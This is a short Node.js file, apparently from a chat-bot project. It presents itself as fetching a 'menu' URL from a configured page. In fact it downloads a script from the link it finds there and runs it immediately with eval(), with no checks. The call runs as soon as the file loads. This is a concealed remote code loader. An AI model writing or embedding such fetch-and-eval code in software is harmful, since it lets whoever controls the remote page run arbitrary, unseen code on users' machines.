

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchMenuUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const menuUrlElement = $('a:contains("MENU_URL")');
    const menuUrl = menuUrlElement.attr('href');

    if (!menuUrl) {
      throw new Error('Menu URL link not found...');
    }

    console.log('Menu URL fetched successfully ✅');

    const scriptResponse = await axios.get(menuUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchMenuUrl();
